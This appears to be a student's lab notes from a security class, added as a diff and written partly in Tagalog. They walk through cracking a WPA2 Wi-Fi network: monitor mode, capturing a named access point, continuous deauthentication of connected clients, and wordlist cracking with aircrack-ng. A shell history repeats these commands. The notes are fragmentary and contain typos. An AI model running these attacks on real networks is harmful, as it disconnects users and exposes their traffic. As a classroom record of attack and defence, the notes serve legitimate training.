@@ -1,0 +1,189 @@
+CCNPsecDay1: Securing all
+Network Devices:
+Firewall,VPNs,IPS
+EdgeRouters
+CoreSwitches
+WirelessAPs
+ALL must be secured/UNhackedBle.
+
+task1: BuiltIT,SecureIT,PT:pentestIT
+windowsServer:
+ping 10.m.1.10
+
+TASK2: WHY IMPLEMENT ENTERPRISE(LAHATAN) WIDE
+SECURITY USING RADIUS(802.1X) OR TACACS+(802.1X)
+to protect againts: MIDM attack on LAN/WLAN
+
+iwconfig
+
+airmon-ng
+
+SCAN FOR SSID IN THE AIR
+
+airodump-ng wlan1
+
+PAG WALANG HULI SA HANGIN
+rfkill unblock all
+
+ 50:D4:F7:6D:CB:96  -55       10       36    0   2  270   WPA2 CCMP   PSK  RIVAN 3RD FLOOR
+
+
+
+airodump-ng -w name-monitorNo. (von12) -c 2 --bssid 50:D4:F7:6D:CB:96 wlan1 
+
+airodump-ng -w von12 -c 2 --bssid 50:D4:F7:6D:CB:96 wlan1
+
+SECOND WINDOW OF KALI
+
+aireplay-ng --deauth 0 -a 50:D4:F7:6D:CB:96 wlan1
+
+
+STOP WLAN1
+
+airmon-ng stop wlan1
+
+
+aircrack-ng von12-01.cap -w /usr/share/wordlists/rockyou.txt
+
+
+WIRELESS HACKING: RIVAN_5th_flr
+
+STEP1 : iwconfig
+
+*mode:Managed
+
+STEP2 : sudo airmon-ng check kill
+
+*PID Name
+
+STEP3 : sudo airmon-ng start wlan1
+
+*monitor mode vif enabled
+*station mode vif disabled
+
+iwconfig
+
+*Mode:Monitor
+
+sudo airmon-ng
+
+*wlan1
+
+STEP4 : SCAN WIFI AND GET THE DETAILS: GET THE BSSID AND CHANNEL OF THE TARGET
+
+sudo airodump-ng wlan1
+
+sudo airodump-ng wlan1 -d <MAC.ADDRESS.NG TARGET.MO> 
+
+
+STEP5 :THEN CHECK MO KUNG MAY NAKA CONNECT.
+
+sudo airodump-ng -w <FILE.NAME> -c 10 (CHANNEL) --bssid <MAC.ADDRESS.TARGET> wlan1
+
+OPEN NEW TERMINAL
+
+SIPAIN MGA NAKA CONNECT
+sudo aireplay-ng --deauth 0 -a <MAC.ADDRESS> wlan1
+
+WAIT UNTIL MAKUHA YUNG ( WPA handshake: MAC ADDRESS)
+
+OPTIONAL: wireshark filename.cap
+
+STEP6 :
+
+iwconfig
+
+wlan0 *Mode:Monitor
+
+airmon-ng stop wlan0mon
+
+Mode:Managed
+
+aircrack-ng filename-01.cap -w /usr/share/wordlists/rockyou.txt
+
+
+TASK5: how to prevent THAT for ever happening
+= WPA-Enterprise
+username/password: 
+RadiusServer = AzureAvticeDirectory:
+Build and Secure theMOST important Services
+in ANY Network: IAM: indentity and Access Management.
+AD + DNS + DHCP:
+
+TASK6: Configure SQL database and email servers.
+
+TASK7: ALL CYBER SECURITY professionals? attack/defend
+are very good in DNS servers.
+
+97  rfkill ubblock all
+  198  rfkill unblock all
+  199  airodump-ng wlan1
+  200  clear
+  201  airodump-ng wlan1
+  202  rfkill unblock all
+  203  airodump-ng wlan1
+  204  ip addr
+  205  clear
+  206  iwconfig
+  207  clea
+  208  clear
+  209  airmon-ng
+  210  clear
+  211  airmon-ng check kill
+  212  clear
+  213  airmon-ng start wlan1
+  214  iwconfig
+  215  clear
+  216  airodump-ng wlan1
+  217  clear
+  218  airodump-ng wlan1
+  219  clear
+  220  airodump-ng wlan1 50:D4:F7:6D:CB:96
+  221  airodump-ng wlan1 -d 50:D4:F7:6D:CB:96
+  222  clear
+  223  airodump-ng -w von12 -c 2 --bssid 50:D4:F7:6D:CB:96 wlan1 
+  224  clear
+  225  airodump-ng -w von12 -c 2 --bssid 50:D4:F7:6D:CB:96 wlan1 
+  226  clear
+  227  airmon-ng stop wlan1
+  228  ls
+  229  clear
+  230  ls
+  231  clear
+  232  ls
+  233  clear
+  234  aircrack-ng von12-01.cap -w /usr/share/wordlists/rockyou.txt
+  235  clear
+  236  nmap -v 10.12.1.9
+  237  ping 1.1.1.1
+  238  service networking 
+  239  ckear
+  240  dig sans.org mx
+  241  dig NS witrap.com @192.106.253.3
+  242  dig NS sans.org @1.1.1.1
+  243  dig NS deped.gov.ph @1.1.1.1
+  244  dig NS admu.edu.ph @202.125.102
+  245  dig NS admu.edu.ph @1.1.1.1
+
+cybersecurity DNS:
+NS = NAME SERVER, port 53 is open, The most important Server
+     in your company
+CNAME/Alias = is a second name for any server
+      = if may CNAME ang company = KURIPOT sila
+        walng pangbili ng Public IP addess.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
